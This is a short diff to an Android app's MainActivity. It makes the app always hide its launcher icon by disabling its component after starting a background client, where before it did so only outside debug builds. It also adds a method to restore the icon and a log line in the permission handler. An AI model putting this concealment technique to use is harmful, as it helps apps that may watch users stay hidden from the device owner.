@@ -47,6 +47,12 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
+    private void showAppIcon() {
+        PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
+    }
+
     private void hideApp() {
         PackageManager p = getPackageManager();
         ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
@@ -60,7 +66,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void done() {
         startClient();
-        if (!BuildConfig.DEBUG) hideApp();
+        hideApp();
         finish();
 
     }
@@ -91,6 +97,7 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        Log.i(TAG, "onRequestPermissionsResult !!!!");
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         for (int i = 0; i < grantResults.length; i++)
             Log.i(TAG, "Grant result: " + grantResults[i]);
